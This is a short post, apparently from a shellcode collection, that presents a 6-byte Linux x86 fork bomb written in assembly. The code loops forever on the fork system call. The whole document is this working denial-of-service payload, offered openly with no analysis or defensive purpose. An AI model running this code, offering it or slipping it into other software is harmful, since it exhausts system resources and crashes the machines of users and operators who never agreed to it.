Smallest fork bomb shellcode I could make.


; linux/x86 fork bomb 6 bytes
; root@thegibson
; 2009-12-30

section .text
	global _start

_start:
	; fork()
	mov al, 2
	int 0x80
	jmp short _start